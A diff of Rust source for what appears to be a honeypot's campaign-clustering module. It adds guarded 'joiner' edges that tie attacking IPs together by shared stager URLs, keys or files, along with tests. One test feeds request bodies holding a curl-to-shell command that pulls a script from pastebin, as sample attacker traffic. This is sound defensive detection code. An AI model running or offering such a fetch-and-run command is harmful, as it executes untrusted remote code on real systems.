@@ -2,14 +2,17 @@
 //! Hard edges are the identity links of [`super::links`] (SSH host key, TLS
 //! certificate, browser fingerprint, reused canary); a soft edge (`paths`)
 //! joins two IPs whose path shapes ([`super::shapes`]) match closely. The
-//! connected components of two or more IPs are the campaigns.
+//! connected components of two or more IPs are the campaigns. A joiner edge
+//! (`stager`, `key`, `file`) joins IPs that name one value in their bodies:
+//! it is a claim anyone can make, so it has a guarded phase of its own and
+//! never counts as hard evidence.
 //!
-//! Recomputed on each node from replicated rows, never replicated, never
-//! written by a person. Every order and tie-break that reaches the output
-//! goes by IP text, never by a node's row ids, so nodes holding the same
-//! rows compute the same campaigns.
+//! Recomputed on each node from replicated rows and its own sightings
+//! ([`super::pieces`]), never replicated, never written by a person. Every
+//! order and tie-break that reaches the output goes by IP text, never by a
+//! node's row ids, so nodes holding the same rows compute the same campaigns.
 use super::Store;
-use super::chains::CHAIN_V;
+use super::chains::{CHAIN_V, JOINER_ROLES};
 use super::links::{LinkKind, all_sightings};
 use crate::model::shape::SHAPE_V;
 use crate::model::xray::XRAY_V;
@@ -18,7 +21,7 @@ use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};
 use std::time::Duration;
 
 /// Version of the algorithm and its constants; a change recomputes.
-pub const CAMPAIGN_V: i64 = 2;
+pub const CAMPAIGN_V: i64 = 3;
 /// Weighted-Jaccard score a `paths` edge needs.
 pub const PATHS_T: f64 = 0.60;
 /// The score it needs when the two IPs share a JA4 and JA4H pair (which
@@ -34,10 +37,12 @@ pub const DF_RARE: usize = 50;
 pub const WINDOW_DAYS: i64 = 30;
 /// Shapes considered per IP, its newest first.
 pub const MAX_SHAPES_PER_IP: usize = 2000;
-/// A hard value on more IPs than this is a shared image or default, not an
-/// operator: it forms no edge and is listed as excluded.
+/// A hard value or a file on more IPs than this is a shared image, default or
+/// public webshell, not an operator: it forms no edge and is listed as
+/// excluded.
 pub const HARD_FANOUT_MAX: usize = 50;
-/// Soft edges two groups of two or more IPs need between them to merge.
+/// Soft edges two groups of two or more IPs need between them to merge, and
+/// the addresses in each of two such groups that must name a joiner value.
 pub const K_SOFT_MERGE: usize = 2;
 /// Fewest shared shapes a pair needs for an order term.
 pub const ORDER_MIN_SHARED: usize = 8;
@@ -62,10 +67,19 @@ const KEY_SIGNATURE: &str = "campaigns.signature";
 /// The last pass's [`Report`] as JSON (`settings`).
 const KEY_REPORT: &str = "campaigns.report";
 const PATHS: &str = "paths";
+/// The edge kinds that join on what a body names: a role in `piece_sightings`
+/// and a `campaign_edges.kind`.
+const JOINERS: [LinkKind; 3] = [LinkKind::Stager, LinkKind::Key, LinkKind::File];
+
+/// Whether an edge of this kind only claims a tie: its value came from a
+/// body or an upload, which anyone can send.
+pub fn is_joiner(kind: &str) -> bool {
+    JOINERS.iter().any(|k| k.key() == kind)
+}
 
 /// The knobs of [`compute`]: whether the order of the shared shapes counts
 /// (`agree` and `veto` apply only then) and how many soft edges two groups
-/// need to merge (`None`: one, as in v1).
+/// need to merge (`None`: one, as in v1, and no joiner edges either).
 #[derive(Debug, Clone, Copy, PartialEq)]
 pub struct Params {
     pub order: bool,
@@ -98,7 +112,7 @@ pub struct Report {
     pub members: usize,
     /// Edges by kind.
     pub edges: BTreeMap<String, usize>,
-    /// Hard values on more than [`HARD_FANOUT_MAX`] IPs.
+    /// Hard values and files on more than [`HARD_FANOUT_MAX`] IPs.
     pub excluded: Vec<Excluded>,
     pub seconds: f64,
     /// When the pass ran (as `requests.ts`); absent in reports written
@@ -171,6 +185,9 @@ pub struct CampaignRow {
     pub last_seen: String,
     pub hard_edges: i64,
     pub soft_edges: i64,
+    /// Joiner edges inside the campaign; those to another campaign are
+    /// listed but tie nothing here. Not part of `hard_edges`.
+    pub joiner_edges: i64,
     pub v: i64,
     pub computed_at: String,
 }
@@ -271,7 +288,8 @@ pub struct CampaignCommand {
 /// Shapes listed on a campaign's page.
 pub const CAMPAIGN_SHAPES: i64 = 25;
 
-/// An evidence edge; `a`'s IP text sorts before `b`'s.
+/// An evidence edge; `a`'s IP text sorts before `b`'s. All but a joiner edge
+/// that was not merged have both ends in one campaign.
 #[derive(Debug, Clone, PartialEq, serde::Serialize, sqlx::FromRow)]
 pub struct Edge {
     pub a_id: i64,
@@ -279,7 +297,9 @@ pub struct Edge {
     pub b_id: i64,
     pub b: String,
     pub kind: String,
-    /// The shared value of a hard kind; empty for `paths`.
+    /// The shared value of a hard or joiner kind; empty for `paths`. A
+    /// joiner's value came from a payload: show it through
+    /// [`LinkKind::shown`].
     pub value: String,
     pub score: Option<f64>,
     pub shared: Option<i64>,
@@ -288,6 +308,9 @@ pub struct Edge {
     pub last_ts: String,
     /// A `paths` edge's order agreement, -1..1, when known.
     pub agreement: Option<f64>,
+    /// Its ends are in one campaign. False for a joiner edge between groups
+    /// that stayed apart.
+    pub merged: bool,
 }
 
 /// What tied a `paths` edge, as the pass stored it.
@@ -309,8 +332,8 @@ pub struct Campaign {
     pub edges: Vec<Edge>,
 }
 
-const ROW_COLS: &str =
-    "key, num, size, first_seen, last_seen, hard_edges, soft_edges, v, computed_at";
+const ROW_COLS: &str = "key, num, size, first_seen, last_seen, hard_edges, soft_edges, \
+     joiner_edges, v, computed_at";
 
 impl Store {
     /// Recompute every campaign from the stored rows (one read snapshot,
@@ -375,8 +398,9 @@ impl Store {
         for c in &out.campaigns {
             sqlx::query(
                 "INSERT INTO campaigns (key, num, anchor_ip_id, size, first_seen, last_seen,
-                                        hard_edges, soft_edges, v, computed_at)
-                 VALUES (?,?,?,?,?,?,?,?,?,?)",
+                                        hard_edges, soft_edges, joiner_edges, v,
+                                        computed_at)
+                 VALUES (?,?,?,?,?,?,?,?,?,?,?)",
             )
             .bind(&c.key)
             .bind(c.num)
@@ -386,6 +410,7 @@ impl Store {
             .bind(&c.last_seen)
             .bind(c.hard_edges)
             .bind(c.soft_edges)
+            .bind(c.joiner_edges)
             .bind(CAMPAIGN_V)
             .bind(&now)
             .execute(&mut *tx)
@@ -401,8 +426,8 @@ impl Store {
         for e in &out.edges {
             sqlx::query(
                 "INSERT INTO campaign_edges (a, b, kind, value, score, shared, fp_support,
-                                             first_ts, last_ts, agreement)
-                 VALUES (?,?,?,?,?,?,?,?,?,?)",
+                                             first_ts, last_ts, agreement, merged)
+                 VALUES (?,?,?,?,?,?,?,?,?,?,?)",
             )
             .bind(e.a)
             .bind(e.b)
@@ -414,6 +439,7 @@ impl Store {
             .bind(&e.first_ts)
             .bind(&e.last_ts)
             .bind(e.agreement)
+            .bind(e.merged)
             .execute(&mut *tx)
             .await?;
             for (shape, df) in &e.shapes {
@@ -482,7 +508,8 @@ impl Store {
         )
     }
 
-    /// A campaign by key, with its members and edges.
+    /// A campaign by key, with its members and edges. An edge that was not
+    /// merged is listed on the campaign of each end.
     pub async fn campaign(&self, key: &str) -> Result<Option<Campaign>> {
         let Some(row) = sqlx::query_as::<_, CampaignRow>(sqlx::AssertSqlSafe(format!(
             "SELECT {ROW_COLS} FROM campaigns WHERE key = ?"
@@ -504,11 +531,12 @@ impl Store {
         .await?;
         let edges = sqlx::query_as(
             "SELECT e.a AS a_id, ia.ip AS a, e.b AS b_id, ib.ip AS b, e.kind, e.value,
-                    e.score, e.shared, e.fp_support, e.first_ts, e.last_ts, e.agreement
+                    e.score, e.shared, e.fp_support, e.first_ts, e.last_ts, e.agreement,
+                    e.merged
              FROM campaign_edges e
-             JOIN campaign_members m ON m.ip_id = e.a
              JOIN ips ia ON ia.id = e.a JOIN ips ib ON ib.id = e.b
-             WHERE m.campaign_key = ?
+             WHERE e.a IN (SELECT ip_id FROM campaign_members WHERE campaign_key = ?1)
+                OR e.b IN (SELECT ip_id FROM campaign_members WHERE campaign_key = ?1)
              ORDER BY ia.ip, ib.ip, e.kind, e.value",
         )
         .bind(key)
@@ -784,6 +812,9 @@ pub(crate) struct Input {
     shapes: Vec<(i64, i64, String, String)>,
     /// (JA4, JA4H) pairs seen per IP.
     tls: Vec<(i64, String, String)>,
+    /// Joiner sightings: kind, value, IP, time. Files over
+    /// [`HARD_FANOUT_MAX`] are here too: [`compute`] lists them as excluded.
+    pub(crate) joiners: Vec<(&'static str, String, i64, String)>,
 }
 
 impl Input {
@@ -835,6 +866,27 @@ impl Input {
         )
         .fetch_all(&mut *conn)
         .await?;
+        // An address's first and last sighting of each value: a botnet's
+        // stager has far more sightings than addresses.
+        let joiners: Vec<(String, String, i64, String)> =
+            sqlx::query_as(sqlx::AssertSqlSafe(format!(
+                "SELECT g.role, p.value, g.ip_id, MIN(g.ts)
+                 FROM piece_sightings g JOIN pieces p ON p.hash = g.piece
+                 WHERE g.role IN {JOINER_ROLES} GROUP BY g.role, g.piece, g.ip_id
+                 UNION
+                 SELECT g.role, p.value, g.ip_id, MAX(g.ts)
+                 FROM piece_sightings g JOIN pieces p ON p.hash = g.piece
+                 WHERE g.role IN {JOINER_ROLES} GROUP BY g.role, g.piece, g.ip_id"
+            )))
+            .fetch_all(&mut *conn)
+            .await?;
+        input.joiners = joiners
+            .into_iter()
+            .filter_map(|(role, value, ip, ts)| {
+                let kind = JOINERS.into_iter().find(|k| k.key() == role)?;
+                Some((kind.key(), value, ip, ts))
+            })
+            .collect();
         Ok(input)
     }
 }
@@ -848,6 +900,7 @@ struct CampaignOut {
     last_seen: String,
     hard_edges: i64,
     soft_edges: i64,
+    joiner_edges: i64,
 }
 
 struct EdgeOut {
@@ -867,6 +920,8 @@ struct EdgeOut {
     /// As [`Link::shapes`], [`Link::tls`].
     shapes: Vec<(i64, i64)>,
     tls: Vec<(String, String)>,
+    /// As [`Link::merged`].
+    merged: bool,
 }
 
 struct Output {
@@ -909,6 +964,8 @@ struct Link {
     /// rarest [`EDGE_SHAPES_MAX`]; its shared (JA4, JA4H) pairs.
     shapes: Vec<(i64, i64)>,
     tls: Vec<(String, String)>,
+    /// Its ends ended up in one group; only a joiner link can end apart.
+    merged: bool,
 }
 
 /// A first and last time, either unknown.
@@ -956,6 +1013,125 @@ fn find(parent: &mut [usize], mut i: usize) -> usize {
     i
 }
 
+/// Join two groups by their roots, the lower root staying.
+fn union(parent: &mut [usize], size: &mut [usize], ra: usize, rb: usize) {
+    let (lo, hi) = (ra.min(rb), ra.max(rb));
+    parent[hi] = lo;
+    size[lo] += size[hi];
+}
+
+/// The addresses (nodes) naming a value, with when, by kind and value.
+type JoinerValues<'a> = BTreeMap<(&'static str, &'a str), BTreeMap<usize, Span>>;
+
+/// The joiner values that can form edges: both ends must name one, so a
+/// value on one address goes. A file on more than [`HARD_FANOUT_MAX`]
+/// addresses goes to `excluded`: it is a public webshell. Stagers and keys
+/// have no such cap: the X-ray's role and shared-host filters decide those.
+fn joiner_values<'a>(
+    input: &'a Input,
+    index: &HashMap<i64, usize>,
+    excluded: &mut Vec<Excluded>,
+) -> JoinerValues<'a> {
+    let mut values = JoinerValues::new();
+    for (kind, value, ip, ts) in &input.joiners {
+        let Some(&i) = index.get(ip) else { continue };
+        let span = values
+            .entry((*kind, value.as_str()))
+            .or_default()
+            .entry(i)
+            .or_insert((None, None));
+        widen(span, Some(ts), Some(ts));
+    }
+    values.retain(|&(kind, value), ips| {
+        if kind == LinkKind::File.key() && ips.len() > HARD_FANOUT_MAX {
+            excluded.push(Excluded {
+                kind: kind.to_string(),
+                value: value.to_string(),
+                ips: ips.len(),
+            });
+            return false;
+        }
+        ips.len() >= 2
+    });
+    values
+}
+
+/// A joiner link from every address to the value's oldest, ties by IP text:
+/// n−1 links, where pairs would be thousands for a botnet's stager.
+fn star(kind: &'static str, value: &str, ips: &BTreeMap<usize, Span>) -> Vec<Link> {
+    let Some((&oldest, oldest_span)) = ips.iter().min_by_key(|&(&i, s)| (s.0.as_deref(), i)) else {
+        return vec![];
+    };
+    ips.iter()
+        .filter(|&(&i, _)| i != oldest)
+        .map(|(&i, s)| {
+            let mut span = s.clone();
+            widen(
+                &mut span,
+                oldest_span.0.as_deref(),
+                oldest_span.1.as_deref(),
+            );
+            Link {
+                a: i.min(oldest),
+                b: i.max(oldest),
+                kind,
+                value: value.to_string(),
+                score: None,
+                shared: None,
+                fp_support: false,
+                agreement: None,
+                first: span.0,
+                last: span.1,
+                shapes: vec![],
+                tls: vec![],
+                merged: true,
+            }
+        })
+        .collect()
+}
+
+/// Group the addresses of `values`, value by value, until nothing changes.
+/// An address outside any group joins freely: the group with the most
+/// addresses naming the value, ties by root IP text, or, with no group among
+/// them, the other lone addresses, as a new group. Two groups of two or more merge only when at least `k` addresses in each
+/// name the same value, so one body counts once however many values it names
+/// and however many links they make.
+fn merge_joiners(values: &JoinerValues, k: usize, parent: &mut [usize], size: &mut [usize]) {
+    loop {
+        let mut changed = false;
+        for ips in values.values() {
+            // Addresses naming the value per group, by root: nodes are in
+            // IP-text order, so a lower root is a lower IP text.
+            let mut naming: BTreeMap<usize, usize> = BTreeMap::new();
+            for &i in ips.keys() {
+                *naming.entry(find(parent, i)).or_default() += 1;
+            }
+            let (lone, groups): (Vec<_>, Vec<_>) =
+                naming.into_iter().partition(|&(r, _)| size[r] == 1);
+            let Some(&(target, _)) = groups
+                .iter()
+                .min_by_key(|&&(r, count)| (std::cmp::Reverse(count), r))
+                .or(lone.first())
+            else {
+                continue;
+            };
+            // The target has the most, so a group with `k` means it has too.
+            // What joins it now cannot lift another group to `k`.
+            let met = groups.iter().filter(|g| g.1 >= k);
+            for &(r, _) in lone.iter().chain(met) {
+                let (ra, rb) = (find(parent, target), find(parent, r));
+                if ra != rb {
+                    union(parent, size, ra, rb);
+                    changed = true;
+                }
+            }
+        }
+        if !changed {
+            return;
+        }
+    }
+}
+
 /// How far two IPs first asked for their shared shapes in the same order,
 /// from −1 (reversed) to 1, over `(shape, first time a, first time b)` and
 /// a shape's document frequency: concordant minus discordant over the pairs
@@ -998,6 +1174,12 @@ fn compute(input: &Input, p: &Params) -> Output {
     // The universe in IP-text order: node i is `nodes[i]`.
     let mut ids: BTreeSet<i64> = input.sightings.iter().map(|s| s.2).collect();
     ids.extend(input.shapes.iter().map(|s| s.0));
+    // What a shape's weight is measured against: addresses only a joiner
+    // names must not move the soft phase.
+    let population = ids.iter().filter(|id| input.ips.contains_key(id)).count();
+    if p.guard.is_some() {
+        ids.extend(input.joiners.iter().map(|s| s.2));
+    }
     let mut nodes: Vec<(&str, i64)> = ids
         .into_iter()
         .filter_map(|id| input.ips.get(&id).map(|ip| (ip.as_str(), id)))
@@ -1051,6 +1233,7 @@ fn compute(input: &Input, p: &Params) -> Output {
                     last: span.1,
                     shapes: vec![],
                     tls: vec![],
+                    merged: true,
                 });
             }
         }
@@ -1087,7 +1270,7 @@ fn compute(input: &Input, p: &Params) -> Output {
             df.entry(s.0).or_default().push(i);
         }
     }
-    let weight = |shape: i64| (1.0 + n as f64 / df[&shape].len() as f64).ln();
+    let weight = |shape: i64| (1.0 + population as f64 / df[&shape].len() as f64).ln();
     let rare = |shape: i64| df[&shape].len() <= DF_RARE;
 
     // Candidates: pairs sharing a rare shape.
@@ -1204,6 +1387,7 @@ fn compute(input: &Input, p: &Params) -> Output {
                 v
             },
             tls: both,
+            merged: true,
         });
     }
 
@@ -1211,11 +1395,6 @@ fn compute(input: &Input, p: &Params) -> Output {
     // guard) soft links only where they join a group strongly enough.
     let mut parent: Vec<usize> = (0..n).collect();
     let mut size: Vec<usize> = vec![1; n];
-    let union = |parent: &mut [usize], size: &mut [usize], ra: usize, rb: usize| {
-        let (lo, hi) = (ra.min(rb), ra.max(rb));
-        parent[hi] = lo;
-        size[lo] += size[hi];
-    };
     for l in links
         .iter()
         .filter(|l| p.guard.is_none() || l.kind != PATHS)
@@ -1247,6 +1426,21 @@ fn compute(input: &Input, p: &Params) -> Output {
             let Some(((ra, rb), _)) = best else { break };
             union(&mut parent, &mut size, ra, rb);
         }
+        // Joiners last, so they never count in the guard above. A body can
+        // name anything, so unlike a soft link a joiner link stays an edge
+        // between groups that stayed apart, marked as not merged.
+        let values = joiner_values(input, &index, &mut excluded);
+        let first_joiner = links.len();
+        for ((kind, value), ips) in &values {
+            for (&i, span) in ips {
+                widen(&mut active[i], span.0.as_deref(), span.1.as_deref());
+            }
+            links.extend(star(kind, value, ips));
+        }
+        merge_joiners(&values, k, &mut parent, &mut size);
+        for l in &mut links[first_joiner..] {
+            l.merged = find(&mut parent, l.a) == find(&mut parent, l.b);
+        }
         // Soft links between groups that stayed apart are not edges.
         let before = links.len();
         links.retain(|l| l.kind != PATHS || find(&mut parent, l.a) == find(&mut parent, l.b));
@@ -1259,10 +1453,13 @@ fn compute(input: &Input, p: &Params) -> Output {
     }
     let mut hard: HashMap<usize, i64> = HashMap::new();
     let mut soft: HashMap<usize, i64> = HashMap::new();
-    for l in &links {
+    let mut joiner: HashMap<usize, i64> = HashMap::new();
+    for l in links.iter().filter(|l| l.merged) {
         let r = find(&mut parent, l.a);
         *if l.kind == PATHS {
             &mut soft
+        } else if is_joiner(l.kind) {
+            &mut joiner
         } else {
             &mut hard
         }
@@ -1307,6 +1504,7 @@ fn compute(input: &Input, p: &Params) -> Output {
             last_seen: span.1.unwrap_or_default(),
             hard_edges: hard.get(&r).copied().unwrap_or(0),
             soft_edges: soft.get(&r).copied().unwrap_or(0),
+            joiner_edges: joiner.get(&r).copied().unwrap_or(0),
         });
     }
     let mut members = vec![];
@@ -1330,6 +1528,7 @@ fn compute(input: &Input, p: &Params) -> Output {
             last_ts: l.last.unwrap_or_default(),
             shapes: l.shapes,
             tls: l.tls,
+            merged: l.merged,
         })
         .collect();
     Output {
@@ -2765,6 +2964,552 @@ pub(crate) mod tests {
         // A–B first (two edges each way, A's root first), then C on three.
         assert_eq!(shape_of(&d), [(9, 5)]);
         assert_eq!(d, dump(&s2).await);
+    }
+
+    /// `ip`'s id in `input`, added if new.
+    fn id_of(input: &mut Input, ip: &str) -> i64 {
+        if let Some((&id, _)) = input.ips.iter().find(|(_, v)| *v == ip) {
+            return id;
+        }
+        let id = input.ips.keys().max().map_or(1, |m| m + 1);
+        input.ips.insert(id, ip.to_string());
+        id
+    }
+
+    /// `ips` tied by one SSH host key.
+    fn hard(input: &mut Input, ips: &[&str], key: &str) {
+        for ip in ips {
+            let id = id_of(input, ip);
+            input
+                .sightings
+                .push((LinkKind::Ssh, key.to_string(), id, Some(at(0))));
+        }
+    }
+
+    /// `ips` naming `value`, a second apart from `from`.
+    fn name_at(input: &mut Input, kind: &'static str, value: &str, ips: &[&str], from: usize) {
+        for (i, ip) in ips.iter().enumerate() {
+            let id = id_of(input, ip);
+            input
+                .joiners
+                .push((kind, value.to_string(), id, at(from + i)));
+        }
+    }
+
+    /// `ips` naming `value`, the first the oldest.
+    fn name(input: &mut Input, kind: &'static str, value: &str, ips: &[&str]) {
+        name_at(input, kind, value, ips, 0);
+    }
+
+    fn v2(input: &Input) -> Output {
+        compute(input, &Params::V2)
+    }
+
+    /// The campaigns as IP text, sorted.
+    fn formed(input: &Input, out: &Output) -> Vec<Vec<String>> {
+        let mut by_key: BTreeMap<&str, Vec<String>> = BTreeMap::new();
+        for (id, key) in &out.members {
+            by_key
+                .entry(key)
+                .or_default()
+                .push(input.ips[id].to_string());
+        }
+        let mut groups: Vec<Vec<String>> = by_key.into_values().collect();
+        groups.iter_mut().for_each(|g| g.sort());
+        groups.sort();
+        groups
+    }
+
+    fn sizes(input: &Input) -> Vec<usize> {
+        formed(input, &v2(input)).iter().map(Vec::len).collect()
+    }
+
+    /// Joiner edges as (a, b, merged), by IP text.
+    fn joiner_edges(input: &Input, out: &Output) -> Vec<(String, String, bool)> {
+        let mut v: Vec<(String, String, bool)> = out
+            .edges
+            .iter()
+            .filter(|e| is_joiner(e.kind))
+            .map(|e| (input.ips[&e.a].clone(), input.ips[&e.b].clone(), e.merged))
+            .collect();
+        v.sort();
+        v
+    }
+
+    const S: &str = "stager.example.org";
+    const G1: [&str; 3] = ["192.0.2.1", "192.0.2.2", "192.0.2.3"];
+    const G2: [&str; 3] = ["192.0.2.4", "192.0.2.5", "192.0.2.6"];
+    const G3: [&str; 3] = ["192.0.2.7", "192.0.2.8", "192.0.2.9"];
+
+    /// Two groups of three on SSH host keys.
+    fn two_groups() -> Input {
+        let mut input = Input::default();
+        hard(&mut input, &G1, "SHA256:one");
+        hard(&mut input, &G2, "SHA256:two");
+        input
+    }
+
+    fn addresses(n: usize) -> Vec<String> {
+        (1..=n).map(|i| format!("198.51.100.{i}")).collect()
+    }
+
+    fn strs(v: &[String]) -> Vec<&str> {
+        v.iter().map(String::as_str).collect()
+    }
+
+    #[test]
+    fn joiner_groups_singletons() {
+        let ips = addresses(60);
+        let mut input = Input::default();
+        name(&mut input, "stager", S, &strs(&ips));
+        let out = v2(&input);
+        assert_eq!(out.campaigns.len(), 1);
+        assert_eq!(out.campaigns[0].size, 60);
+        assert!(out.excluded.is_empty());
+    }
+
+    #[test]
+    fn joiner_makes_a_star() {
+        let ips = addresses(5);
+        let mut oldest_last: Vec<&str> = strs(&ips);
+        oldest_last.reverse();
+        let mut input = Input::default();
+        name(&mut input, "key", "SHA256:k", &oldest_last);
+        let out = v2(&input);
+        assert_eq!(out.edges.len(), 4);
+        for e in &out.edges {
+            assert_eq!(
+                (e.kind, e.value.as_str(), e.b),
+                ("key", "SHA256:k", id_of(&mut input, "198.51.100.5"))
+            );
+            assert!(e.merged);
+        }
+        let first = &out.edges[0];
+        assert_eq!(first.first_ts, at(0), "the oldest's time");
+    }
+
+    #[test]
+    fn value_on_one_address_forms_no_edge() {
+        let mut input = two_groups();
+        name(&mut input, "stager", S, &[G1[0]]);
+        name(&mut input, "file", "ab", &["198.51.100.1"]);
+        let out = v2(&input);
+        assert!(joiner_edges(&input, &out).is_empty());
+        assert_eq!(sizes(&input), [3, 3]);
+    }
+
+    #[test]
+    fn one_forged_address_does_not_merge_groups() {
+        let mut input = two_groups();
+        name(&mut input, "stager", S, &[G1[0], G2[0], G2[1]]);
+        assert_eq!(sizes(&input), [3, 3]);
+    }
+
+    #[test]
+    fn forged_stager_and_key_from_one_address_do_not_merge() {
+        let mut input = two_groups();
+        // One body from G1 names both, two addresses of G2 name both.
+        name(&mut input, "stager", S, &[G2[0], G2[1], G1[0]]);
+        name(&mut input, "key", "SHA256:k", &[G2[0], G2[1], G1[0]]);
+        assert_eq!(sizes(&input), [3, 3]);
+    }
+
+    #[test]
+    fn k_addresses_in_each_group_merge() {
+        let mut input = two_groups();
+        name(&mut input, "stager", S, &[G1[0], G1[1], G2[0], G2[1]]);
+        let out = v2(&input);
+        assert_eq!(sizes(&input), [6]);
+        assert_eq!(out.campaigns[0].joiner_edges, 3);
+        assert!(out.edges.iter().all(|e| e.merged));
+    }
+
+    #[test]
+    fn k_on_one_side_only_does_not_merge() {
+        let mut input = two_groups();
+        name(&mut input, "stager", S, &[G1[0], G1[1], G1[2], G2[0]]);
+        assert_eq!(sizes(&input), [3, 3]);
+    }
+
+    #[test]
+    fn three_groups_each_with_k_merge_at_once() {
+        let mut input = two_groups();
+        hard(&mut input, &G3, "SHA256:three");
+        let ips = [G1[0], G1[1], G2[0], G2[1], G3[0], G3[1]];
+        name(&mut input, "stager", S, &ips);
+        assert_eq!(sizes(&input), [9]);
+    }
+
+    #[test]
+    fn unmet_merge_keeps_its_edge_unmerged() {
+        let mut input = two_groups();
+        name(&mut input, "stager", S, &[G1[0], G1[1], G2[0]]);
+        let out = v2(&input);
+        assert_eq!(
+            joiner_edges(&input, &out),
+            [
+                (G1[0].to_string(), G1[1].to_string(), true),
+                (G1[0].to_string(), G2[0].to_string(), false),
+            ]
+        );
+        // Counted inside the campaign only.
+        let joiners: Vec<i64> = out.campaigns.iter().map(|c| c.joiner_edges).collect();
+        assert_eq!(joiners.iter().sum::<i64>(), 1, "{joiners:?}");
+    }
+
+    #[test]
+    fn a_merge_repeats_until_nothing_changes() {
+        let mut input = two_groups();
+        hard(&mut input, &G3, "SHA256:three");
+        // "a" sorts first: one address each of G1 and G2 until "b" merges
+        // them, then two of the group, as many as G3 has.
+        name(&mut input, "stager", "a", &[G1[0], G2[0], G3[0], G3[1]]);
+        name(&mut input, "stager", "b", &[G1[0], G1[1], G2[0], G2[1]]);
+        assert_eq!(sizes(&input), [9]);
+    }
+
+    #[test]
+    fn a_singleton_joins_the_group_with_most_naming_addresses() {
+        let lone = "198.51.100.1";
+        let mut input = two_groups();
+        name(&mut input, "stager", S, &[G1[0], G2[0], G2[1], lone]);
+        let out = v2(&input);
+        let want = [G1.map(String::from).to_vec(), {
+            let mut v = vec![lone.to_string()];
+            v.extend(G2.map(String::from));
+            v.sort();
+            v
+        }];
+        assert_eq!(formed(&input, &out), want);
+    }
+
+    #[test]
+    fn a_singleton_tie_goes_by_root_ip_text() {
+        let lone = "198.51.100.1";
+        let mut input = two_groups();
+        name(&mut input, "stager", S, &[G2[0], G1[0], lone]);
+        let out = v2(&input);
+        let joined = formed(&input, &out)
+            .into_iter()
+            .find(|g| g.contains(&lone.to_string()))
+            .unwrap();
+        assert!(joined.contains(&G1[0].to_string()), "{joined:?}");
+    }
+
+    #[test]
+    fn a_joined_singleton_does_not_add_to_the_guard() {
+        // Two fresh addresses lift no group to K but the one they joined.
+        let mut input = two_groups();
+        let ips = [G1[0], G2[0], "198.51.100.1", "198.51.100.2"];
+        name(&mut input, "stager", S, &ips);
+        assert_eq!(sizes(&input), [5, 3]);
+    }
+
+    #[test]
+    fn value_order_does_not_change_the_outcome_across_runs() {
+        let build = |rev: bool| {
+            let mut input = two_groups();
+            let mut rows = [
+                ("stager", "a", [G1[0], G2[0], "198.51.100.1"]),
+                ("key", "b", [G1[0], G1[1], "198.51.100.2"]),
+            ];
+            if rev {
+                rows.reverse();
+            }
+            for (kind, value, ips) in rows {
+                name(&mut input, kind, value, &ips);
+            }
+            if rev {
+                input.joiners.reverse();
+            }
+            input
+        };
+        let (x, y) = (build(false), build(true));
+        assert_eq!(formed(&x, &v2(&x)).len(), formed(&y, &v2(&y)).len());
+        let edges = |i: &Input| {
+            let mut v: Vec<_> = joiner_edges(i, &v2(i)).into_iter().map(|e| e.2).collect();
+            v.sort();
+            v
+        };
+        assert_eq!(edges(&x), edges(&y));
+    }
+
+    #[tokio::test]
+    async fn joiners_do_not_feed_the_soft_guard() {
+        let (s, _d) = store().await;
+        feed(&s, chain_fixture(false)).await;
+        let mut conn = s.pool.acquire().await.unwrap();
+        let mut input = Input::read(&mut conn).await.unwrap();
+        drop(conn);
+        // One soft edge H1–H2, one more between them by a claim: not two.
+        name(&mut input, "stager", S, &[H1[1], H2[1]]);
+        let out = v2(&input);
+        assert_eq!(out.withheld, 1);
+        assert_eq!(sizes(&input), [3, 3]);
+        assert_eq!(joiner_edges(&input, &out).len(), 1);
+        assert!(!joiner_edges(&input, &out)[0].2);
+    }
+
+    #[tokio::test]
+    async fn a_joiner_merge_keeps_the_soft_edge_between_the_groups() {
+        let (s, _d) = store().await;
+        feed(&s, chain_fixture(false)).await;
+        let mut conn = s.pool.acquire().await.unwrap();
+        let mut input = Input::read(&mut conn).await.unwrap();
+        drop(conn);
+        name(&mut input, "stager", S, &[H1[1], H1[2], H2[1], H2[2]]);
+        let out = v2(&input);
+        assert_eq!(out.withheld, 0);
+        assert_eq!(out.campaigns[0].soft_edges, 1);
+    }
+
+    #[test]
+    fn file_keeps_the_fanout_cap() {
+        let ips = addresses(HARD_FANOUT_MAX + 1);
+        let mut input = Input::default();
+        name(&mut input, "file", "aa", &strs(&ips));
+        let out = v2(&input);
+        assert!(out.campaigns.is_empty() && out.edges.is_empty());
+        assert_eq!(
+            out.excluded,
+            [Excluded {
+                kind: "file".into(),
+                value: "aa".into(),
+                ips: HARD_FANOUT_MAX + 1,
+            }]
+        );
+        let mut input = Input::default();
+        name(&mut input, "file", "aa", &strs(&ips[1..]));
+        let out = v2(&input);
+        assert_eq!(out.campaigns[0].size, HARD_FANOUT_MAX as i64);
+        assert!(out.excluded.is_empty());
+    }
+
+    /// `body` as a request of `ip`, as the X-ray will read it.
+    fn sends(ip: &str, ts: &str, path: &str, body: &str) -> Op {
+        Op::Rec(Record::Request(Box::new(RequestRec {
+            uid: format!("{ip} {ts} {path}"),
+            ts: ts.into(),
+            ip: ip.into(),
+            method: "POST".into(),
+            path: path.into(),
+            headers_json: "[]".into(),
+            labels_json: "[]".into(),
+            body: Some(body.as_bytes().to_vec()),
+            ..Default::default()
+        })))
+    }
+
+    #[tokio::test]
+    async fn shared_host_value_joins_by_full_url() {
+        let (s, _d) = store().await;
+        let mut ops = vec![];
+        for (i, (ip, paste)) in [
+            ("192.0.2.1", "aaa"),
+            ("192.0.2.2", "aaa"),
+            ("192.0.2.3", "bbb"),
+            ("192.0.2.4", "bbb"),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let body = format!("curl -s https://pastebin.com/raw/{paste} | sh");
+            ops.push(sends(ip, &at(i), "/x", &body));
+        }
+        feed(&s, ops).await;
+        crate::store::pieces::extract(&s.pool).await.unwrap();
+        s.recompute_campaigns(true).await.unwrap();
+        let d = dump(&s).await;
+        let edges: Vec<(&str, &str, &str, &str)> =
+            d.2.iter()
+                .map(|e| (e.0.as_str(), e.1.as_str(), e.2.as_str(), e.3.as_str()))
+                .collect();
+        assert_eq!(
+            edges,
+            [
+                (
+                    "192.0.2.1",
+                    "192.0.2.2",
+                    "stager",
+                    "https://pastebin.com/raw/aaa"
+                ),
+                (
+                    "192.0.2.3",
+                    "192.0.2.4",
+                    "stager",
+                    "https://pastebin.com/raw/bbb"
+                ),
+            ]
+        );
+    }
+
+    #[test]
+    fn hard_edges_count_ignores_joiners() {
+        let mut input = Input::default();
+        hard(&mut input, &[G1[0], G1[1]], "SHA256:one");
+        name(&mut input, "stager", S, &[G1[0], G1[1]]);
